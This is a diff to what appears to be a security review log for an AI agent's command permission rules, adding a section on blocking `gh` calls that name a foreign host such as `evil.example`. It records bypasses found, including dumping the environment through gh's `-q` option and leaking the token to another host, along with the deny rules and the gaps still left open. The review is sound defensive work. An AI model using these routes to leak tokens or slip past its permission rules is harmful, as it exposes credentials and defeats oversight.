@@ -3768,3 +3768,9 @@ path `a/b`. What was done instead:
 `gh ... -q env` printed the process environment (gh's jq has `env`). The short `-q` and `-t` (and `gh * --q*`, and a `-?q` cluster such as `-sq`) are denied for every `gh` shape, with the
 `-\q` splice already covered by `*-/*`. Also denied: `gh api --verbose|--include|--preview|--cache|--slurp|-i`, `git --orderfile|-O`. Left as documented residuals: patch content of committed
 secrets, the `read`/`grep`/`glob` tools' resource (the shell replay cannot exercise them), the `decision_actor` fail-open (advisory; unreachable from the Chief of Staff's permissions).
+
+### Fifth review (#108 at f08f99e): no foreign host for `gh`
+
+`gh -R evil.example/o/r ...` or a foreign-host URL would send gh's request (and token) to that host. Denied for every `gh` shape: `-R`/`--repo` in any host form (`HOST/OWNER/REPO`, a dot before the first slash, `@`),
+and, for the read and merge shapes, any `://` or `@` argument and `gh api http*`; for the comment/close/edit shapes a URL in first (selector) position. `-R OWNER/REPO` stays allowed. A URL
+inside free text, or a selector URL placed after flags in a comment/close/edit command, is not caught (documented residual; the message commands must keep their text).
